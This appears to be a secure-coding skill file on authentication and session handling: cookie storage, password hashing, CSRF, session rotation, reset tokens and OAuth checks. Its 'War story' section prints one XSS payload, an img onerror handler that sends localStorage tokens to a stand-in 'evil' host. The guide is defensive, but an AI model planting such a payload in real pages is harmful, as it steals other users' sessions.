---
name: auth-and-sessions
description: Use when the user is wiring login, signup, logout, OAuth, JWTs, session cookies, "remember me", password reset, magic links, or token storage. Covers httpOnly cookies vs localStorage, CSRF, session rotation, password hashing, logout-everywhere.
---

# Auth & Sessions

## When to use
- Building login / signup / logout / password reset / magic link flows
- Issuing or verifying JWTs, session tokens, or refresh tokens
- Choosing where to store tokens (cookie? localStorage? memory?)
- Wiring OAuth / OIDC / SSO with a provider
- Adding "remember me" or device-management features

## When to skip
- The app uses a managed auth provider (Clerk, WorkOS, Auth0, Supabase Auth, better-auth) **and** the user is just calling its SDK — defer to provider docs
- Pure read-only public pages with no auth at all

## Default to a managed provider

In 2026, hand-rolling auth is rarely the right call. Default to **better-auth**, **Clerk**, **WorkOS**, **Lucia** (with care — check maintenance status), **Supabase Auth**, or **Auth.js v5**. Hand-roll only if there's a real reason (regulatory, custom IdP, learning exercise).

If the user is hand-rolling: the rules below are non-negotiable.

## The rules

### 1. Tokens go in httpOnly cookies. Not localStorage.

```ts
// BAD — XSS reads the token in one line of injected JS
localStorage.setItem('token', jwt)

// GOOD — cookie is invisible to JS
cookies.set('session', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',
  path: '/',
  maxAge: 60 * 60 * 24 * 7, // 7 days
})
```

Why: any XSS — a single broken `dangerouslySetInnerHTML`, a compromised npm package — can drain `localStorage` in one line. `httpOnly` cookies are unreachable to JS.

### 2. `sameSite: 'lax'` minimum. `'strict'` if you can.

`lax` blocks cross-site POSTs (most CSRF). `strict` blocks even top-level cross-site GETs (breaks OAuth redirects — use `lax` for the auth cookie, `strict` for sensitive action cookies).

### 3. Use opaque session IDs in the cookie. Not raw JWTs (usually).

Store a random ID in the cookie; look up the session record in your DB/Redis. Lets you **revoke instantly** (logout-everywhere, security incident). Stateless JWTs cannot be revoked without a denylist — and a denylist is just a stateful session store with worse ergonomics.

JWTs are appropriate for **short-lived access tokens** between services, not for browser sessions.

### 4. Hash passwords with argon2id. Bcrypt is acceptable. SHA-anything is not.

```ts
import { hash, verify } from '@node-rs/argon2'
const passwordHash = await hash(password, {
  memoryCost: 19_456, // 19 MiB
  timeCost: 2,
  parallelism: 1,
})
```

Never store plaintext. Never use MD5/SHA-1/SHA-256 for passwords — they're fast by design, which is wrong for password hashing.

### 5. Rotate the session ID on privilege change.

After login, after password change, after MFA enrollment, after role escalation: issue a new session ID and invalidate the old. Prevents **session fixation**.

### 6. Logout invalidates server-side. Always.

```ts
// BAD — only clears the cookie. The token still works if stolen.
cookies.delete('session')

// GOOD
await db.session.delete({ where: { id: sessionId } })
cookies.delete('session')
```

### 7. CSRF: `sameSite: 'lax'` + double-submit token, or use Server Actions.

Next.js Server Actions and Remix actions have built-in CSRF protection via origin checks. If you expose a plain `POST /api/...` that uses cookie auth, add a CSRF token (double-submit pattern) **on top of** `sameSite: 'lax'`.

### 8. Magic links and password reset tokens: single-use, short-lived, hashed at rest.

```ts
// Store hash(token), not token. Send token via email.
const token = randomBytes(32).toString('hex')
await db.resetToken.create({
  data: { userIdHash: hash(token), expiresAt: addMinutes(new Date(), 15) },
})
// Then: lookup by hash, mark used after redemption, never log the token
```

### 9. Rate-limit the auth endpoints. Hard.

Login, signup, password reset, MFA verify — all are credential-stuffing and brute-force targets. Per-IP and per-account limits. Lockouts with exponential backoff. See `api-route-hardening`.

### 10. Email enumeration: same response for "user exists" and "user doesn't."

```ts
// BAD
if (!user) return { error: 'No account with that email' }
if (!validPassword) return { error: 'Wrong password' }

// GOOD
if (!user || !validPassword) return { error: 'Invalid credentials' }
// And: send the password-reset email regardless of whether the email exists
```

## OAuth specifics

- Always validate `state` on callback (CSRF for the OAuth handshake)
- Use **PKCE** for public clients (mobile, SPA) — and for confidential clients too, it's free
- Validate `id_token` signature, `iss`, `aud`, `exp`, `nonce` — do not trust the provider's redirect blindly
- Store the provider's `sub` (subject), not the email, as the stable identity key

## War story

A "build in public" SaaS stored JWTs in localStorage and shipped a markdown renderer that didn't sanitize images. A user submitted a profile bio with `<img src=x onerror="fetch('https://evil/x?t='+localStorage.token)">`. Every other user who viewed that profile leaked their session. Took down all paid customers' accounts. Two-line fix (httpOnly cookie + sanitizer) prevented by being made on day one.

## Quick checklist

- [ ] Tokens in `httpOnly`, `secure`, `sameSite: 'lax'` cookies — never localStorage
- [ ] Opaque session ID, not raw JWT, for browser sessions
- [ ] Passwords hashed with argon2id (or bcrypt as fallback)
- [ ] Session ID rotated on login / password change / privilege escalation
- [ ] Logout deletes the server-side session
- [ ] CSRF protection (Server Actions, or `sameSite: 'lax'` + double-submit token)
- [ ] Reset/magic-link tokens hashed at rest, single-use, ≤15min TTL
- [ ] Auth endpoints rate-limited per-IP and per-account
- [ ] Same response for unknown email + wrong password
